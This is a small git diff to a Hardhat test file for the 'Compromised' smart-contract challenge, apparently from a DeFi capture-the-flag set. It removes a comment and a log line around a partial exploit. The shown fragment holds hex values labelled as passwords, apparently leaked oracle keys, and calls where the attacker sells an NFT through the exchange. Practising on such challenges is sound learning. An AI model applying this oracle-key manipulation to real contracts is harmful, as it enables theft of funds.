@@ -61,7 +61,6 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
-        // better blender the ice up
         const tokenSymbol = "DVNFT";
 		const passwords = [
             "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9",
@@ -101,9 +100,8 @@ describe('Compromised challenge', function () {
 		await this.nftToken.connect(attacker).approve(this.exchange.address,tokenId);
 		await this.exchange.connect(attacker).sellOne(tokenId);
  
-        console.log("export")
- 
     });
+
     after(async function () {
         /** SUCCESS CONDITIONS */
         
@@ -128,3 +126,5 @@ describe('Compromised challenge', function () {
         ).to.eq(INITIAL_NFT_PRICE);
     });
 });
+
+ 
